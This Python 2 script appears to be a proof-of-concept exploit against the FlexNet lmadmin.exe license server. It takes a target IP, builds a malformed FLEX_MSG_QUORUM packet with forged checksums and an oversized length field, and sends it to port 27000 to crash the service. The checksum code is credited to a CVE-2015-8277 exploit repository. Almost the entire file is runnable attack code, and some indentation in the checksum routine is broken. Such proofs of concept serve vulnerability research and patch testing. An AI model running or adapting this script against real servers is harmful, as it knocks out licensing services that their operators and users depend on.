import struct, socket, string
import binascii, argparse, time

# Got it from the Internet 
def hexdump(src, length=16):
  DISPLAY = string.digits + string.letters + string.punctuation
  FILTER = ''.join(((x if x in DISPLAY else '.') for x in map(chr, range(256))))
  lines = []
  for c in xrange(0, len(src), length):
    chars = src[c:c+length]
    hex = ' '.join(["%02x" % ord(x) for x in chars])
    if len(hex) > 24:
      hex = "%s %s" % (hex[:24], hex[24:])
    printable = ''.join(["%s" % FILTER[ord(x)] for x in chars])
    lines.append("%08x:  %-*s  %s\n" % (c, length*3, hex, printable))
  return ''.join(lines)

def dump(title, data):
  print '---[ %s ]--- ' % (title)
  print hexdump(data) 

# https://github.com/securifera/CVE-2015-8277-Exploit/blob/master/arc_poc.py
def header_checksum(packet,header_len = 20):
  packet_bytes = packet
  checksum = ord(packet_bytes[0])
  i = 2
  while i < header_len:
    checksum = checksum + ord(packet_bytes[i])
    i = i + 1
    
  return (checksum & 0x0FF)
  
# https://github.com/securifera/CVE-2015-8277-Exploit/blob/master/arc_poc.py
def data_checksum(packet_data):
  word_table = []
  i = 0
  while i < 256:
    v4 = 0
    v3 = i
    j = 8

    while j > 0:
      if ((v4 ^ v3) & 1) == 1:
    v4 = ((v4 >> 1) ^ 0x3A5D) & 0x0FFFF
      else:
    v4 = (v4 >> 1) & 0x0FFFF
        
      v3 >>= 1
      j = j - 1
      

    word_table.append( v4 & 0x0FFFF )
    i = i + 1
    
  k = 0
  checksum = 0
  data_bytes = packet_data
  while k < len(packet_data):
    position = ord(data_bytes[k]) ^ (checksum & 0x0FF)
    this_word = word_table[position] & 0x0FFFF
    checksum = (this_word ^ (checksum >> 8)) & 0x0FFFF
    k = k + 1
    
  return checksum

def create_msg(cmd, data, flags=0, id=0xdeadbeef):
  pkt = "\x2f" 
  pkt += "\x00"     # header checksum
  pkt += "\x00\x00" # data checksum
  pkt += "\x00\x00" # pkt length

  pkt += struct.pack( ">H", cmd)
  pkt += struct.pack( ">I", id)
  pkt += struct.pack( ">I", 0)
  pkt += struct.pack( ">H", 0)
  pkt += struct.pack( ">H", flags)
  pkt += data

  pkt_len = struct.pack( ">H", len(pkt))
  pkt = pkt[:4] + pkt_len + pkt[6:]
 
  data_sum = data_checksum(pkt[4:])
  data_sum_str = struct.pack( ">H", data_sum)
  pkt = pkt[:2] + data_sum_str + pkt[4:]

  hdr_sum = header_checksum(pkt[:20])
  pkt = pkt[:1] + chr(hdr_sum) + pkt[2:]
  return pkt


#
# MAIN
#
desc = 'This PoC attempts to terminate lmadmin.exe.'

arg_parser = argparse.ArgumentParser(desc)
arg_parser.add_argument('-t', required=True, help='Target IP (Required)')
arg_parser.add_argument('-p', type=int, default=27000, help='lmadmin.exe port, default: 27000')

args = arg_parser.parse_args()
host = args.t
port = args.p

data = struct.pack(">I",0x7fffffff) + 'A' * 8 
req = create_msg(282, data)
dump('req', req)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print "Sending a malformed FLEX_MSG_QUORUM..."
s.send(req)
print "Please check if lmadmin has terminated."
print "If not, wait for a few seconds and rerun this PoC."